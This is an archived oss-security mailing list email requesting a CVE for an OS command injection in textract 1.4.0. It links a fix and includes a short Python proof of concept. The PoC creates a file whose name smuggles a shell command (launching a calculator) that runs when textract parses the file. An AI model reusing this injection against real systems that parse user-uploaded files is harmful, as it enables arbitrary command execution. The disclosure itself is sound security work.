X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["834" "Thursday" "20" "October" "2016" "17:40:50" "-0400" "Pierre Ernst" "pernst@salesforce.com" "<CAO8=cJ-0zddSyndp=8ot8BHxyeC2r0Ln0nQvbFx0JQ3Dpg=0dA@mail.gmail.com>" "40" "[oss-security] CVE request - textract 1.4.0 - OS Command Injection" nil nil nil "10" "2016102021:40:50" "[oss-security] CVE request - textract 1.4.0 - OS Command Injection" (number mark "U       pernst@sales Oct 20   40/834   " thread-indent "\"[oss-security] CVE request - textract 1.4.0 - OS Command Injection\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 5169 invoked by uid 550); 20 Oct 2016 22:03:43 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 26199 invoked from network); 20 Oct 2016 21:41:03 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=salesforce.com; s=google;
        h=mime-version:from:date:message-id:subject:to;
        bh=b5ST4PWKfk4lmm4jmTtxxr/bPiH65ySyEKgKiI5Z05g=;
        b=HK4aDAN7bTVvDWSf6ULJhakWbzDkY2ckDbBKxW7WgdbgQorr+I4qLTEs8f/zYMPUsc
         mfX9xIKn2YlDMM9aMVqTQSB7BdKp51gUfWZ95IA91UH7v7V2D0ydEiVnGRLT1jepWCoV
         dVY3+9z3E95aArnM0ADv8GRd3zrFaoAckdeCE=
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20130820;
        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
        bh=b5ST4PWKfk4lmm4jmTtxxr/bPiH65ySyEKgKiI5Z05g=;
        b=FyfmtJNVKdSwFkpyT271QAOrTcSvxp6kvJ9lGvUF6gEUdi1hRMzURt5evGXc40Y93n
         D0UWt3343xDbEA2N/ps+NKELDh8xphm6m8kSTiViduqGp956/9owNOfy/Y4Dm96sdS87
         UMEPI+TGYYA6HXKuP3MFdvzmhkxzRF1v2L6Cck74p2WaLz/NNcdVfXMjy7GzKksChBnu
         vKaPxMyunsAjIVZLuxe9SVtRnXrnya3f5plPdq2nb0sm0AmH1Lq6wdkpm8gfxldMn4eP
         Ymhhs3UbVK91n2JMTtw9Dz+lLL/ztBW6wnbN9JlCcnoYw5SbSshHojVsJOMwZdC2V9Yf
         xyLQ==
X-Gm-Message-State: ABUngvfjYjMspKpeTvTP1jIML9Y4lK2eLY/Ef6P667lfpFbWQgQFiOccnyWivOwyaFahhaKpPC1e0GlXUotuUdRL
X-Received: by 10.25.135.130 with SMTP id j124mr2093601lfd.44.1476999651317;
 Thu, 20 Oct 2016 14:40:51 -0700 (PDT)
MIME-Version: 1.0
From: Pierre Ernst <pernst@salesforce.com>
Date: Thu, 20 Oct 2016 17:40:50 -0400
Message-ID: <CAO8=cJ-0zddSyndp=8ot8BHxyeC2r0Ln0nQvbFx0JQ3Dpg=0dA@mail.gmail.com>
To: oss-security@lists.openwall.com
Content-Type: multipart/alternative; boundary=001a113fbc448d0b6e053f52c775
Subject: [oss-security] CVE request - textract 1.4.0 - OS Command Injection

--001a113fbc448d0b6e053f52c775
Content-Type: text/plain; charset=UTF-8

The Python textract component (
https://github.com/deanmalmgren/textract/tree/v1.4.0) is vulnerable to OS
command injection.

this fork contains a fix:
https://github.com/pierre-ernst/textract


Parsing a file with a malicious name leads to arbitrary OS command
injection, this is especially risky when parsing user-supplied files on a
server (e.g. uploaded files)

PoC:

import textract
import sys
import os

# create a file with a malicious name and arbitrary content
fileName = './test";gnome-calculator;#.pdf'
file = open(fileName,'w+')
file.write('Pierre Ernst, Salesforce')
file.close()

# parse newly created file
text = textract.process(fileName)
print text

# cleanup
os.remove(fileName);


-- 
Pierre Ernst
Salesforce

--001a113fbc448d0b6e053f52c775--
